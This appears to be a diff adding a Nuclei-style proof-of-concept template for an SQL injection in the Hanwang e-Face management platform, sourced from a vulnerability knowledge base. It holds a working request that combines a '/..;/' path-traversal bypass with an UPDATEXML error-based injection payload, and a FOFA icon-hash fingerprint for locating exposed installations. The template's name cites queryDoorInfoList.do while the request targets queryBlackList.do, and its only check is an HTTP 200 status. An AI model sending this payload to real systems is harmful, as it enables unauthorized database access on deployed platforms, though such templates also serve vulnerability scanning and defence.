@@ -1,0 +1,19 @@
+id: poc-ubc53ansphip671r
+info:
+  name: 汉王e脸通综合管理平台 queryDoorInfoList.do SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ubc53ansphip671r'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ubc53ansphip671r
+    fofa: icon_hash="1380907357"
+http:
+- raw:
+  - GET /manage/dgmCommand/finishRegister.do/..;/..;/systemBlackList/queryBlackList.do?page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
